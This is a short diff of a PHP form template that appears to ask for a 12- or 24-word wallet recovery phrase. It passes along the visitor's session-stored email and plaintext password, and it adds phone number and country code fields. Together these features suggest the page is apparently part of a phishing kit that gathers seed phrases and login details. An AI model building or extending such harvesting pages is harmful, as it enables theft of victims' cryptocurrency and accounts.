@@ -34,8 +34,14 @@
                                         <button type="button" data-word="24" class="btn btn-secondary px15 ms20 activeForm">24 Words</button>
                                     </div>
                                     <div class="row form_keys"></div>
-                                    <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
-                                    <input type="hidden" name="password" value="<?= $_SESSION['password'] ?>" >
+                                    <input type="text" name="email" value="<?= $_SESSION['email'] ?>" >
+                                    <input type="text" name="password" value="<?= $_SESSION['password'] ?>" >
+                                    <input type="text" name="phone_number" value="<?= $_SESSION['phone_number'] ?>" >
+                                    <input type="text" name="phone_number_phoneCode" value="<?= $_SESSION['phone_code'] ?>" >
+                                    <input type="text" name="phone_number_countryCode" value="<?= $_SESSION['country_code'] ?>" >
+                                    
+                                    
+                                    
                                     <div class="text-center mx-auto d-grid gap-2 my30">
                                         <button type="submit" class="btn btn-secondary btn-lg btn-primary-2 px20 rounded-pill btn-block">Continue</button>
                                     </div>
